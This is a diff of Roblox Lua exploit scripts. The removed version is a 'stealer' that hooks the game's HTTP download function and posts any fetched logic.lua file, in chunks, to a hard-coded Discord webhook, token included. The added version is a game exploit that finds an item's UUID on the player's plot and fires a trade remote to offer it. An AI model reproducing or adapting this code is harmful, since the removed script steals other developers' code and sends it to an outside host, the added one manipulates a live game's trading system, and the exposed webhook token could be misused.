@@ -1,34 +1,39 @@
-local webhook = "Yhttps://discord.com/api/webhooks/1554824730295537748/tGtbX0XaBJwGoI-dDfVhQFLna4qSzFCa8tvli7BW4FogXZP5Bn-SS8SuEYfTbIS9WboH"
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local LP = Players.LocalPlayer
 
-local function sendToDiscord(content)
-    local payload = {
-        ["content"] = content,
-        ["username"] = "Opiumware Stealer"
-    }
-    local request = http and http.request or syn and syn.request or request
-    if request then
-        request({
-            Url = webhook,
-            Method = "POST",
-            Headers = {["Content-Type"] = "application/json"},
-            Body = game:GetService("HttpService"):JSONEncode(payload)
-        })
+-- The exact remote used to add items to a trade
+local Net = ReplicatedStorage:WaitForChild("Packages"):WaitForChild("Net")
+local AddTradeItem = Net:FindFirstChild("AddTradeItem", true) or Net:FindFirstChild("AddItem", true)
+
+local function offerItem(itemName)
+    if not AddTradeItem then
+        print("Could not find AddTradeItem remote!")
+        return
     end
-end
-
--- Intercept the download and send it to Discord
-local oldHttpGet = game.HttpGet
-game.HttpGet = function(self, url, ...)
-    local res = oldHttpGet(self, url, ...)
-    if string.find(url, "logic.lua") then
-        sendToDiscord("Found Logic! Length: " .. #res)
-        -- Split into 1900 character chunks so Discord doesn't reject it
-        for i = 1, #res, 1900 do
-            local chunk = string.sub(res, i, i + 1899)
-            sendToDiscord("```lua\n" .. chunk .. "\n```")
-            task.wait(1)
+    
+    -- In most of these exploit scripts, the argument is the item's unique ID (UUID)
+    -- We read your plot inventory to find the Strawberrita's ID
+    local Plots = workspace:FindFirstChild("Plots")
+    local myPlot = Plots and Plots:FindFirstChild(LP.Name)
+    
+    if myPlot then
+        for _, obj in ipairs(myPlot:GetDescendants()) do
+            if obj.Name == "Item" and obj:GetAttribute("Brainrot") == itemName then
+                local uuid = obj:GetAttribute("UUID") or obj.Name
+                print("Found " .. itemName .. "! Offering UUID: " .. uuid)
+                
+                -- Fire the remote to place it in the trade
+                pcall(function()
+                    AddTradeItem:FireServer(uuid)
+                end)
+                return
+            end
         end
     end
-    return res
+    print("Could not find " .. itemName .. " on your plot.")
 end
-print("Proxy active. Waiting for logic.lua...")
+
+-- TEST IT: Replace this with the exact item you want to test
+task.wait(2)
+offerItem("Strawberrita")
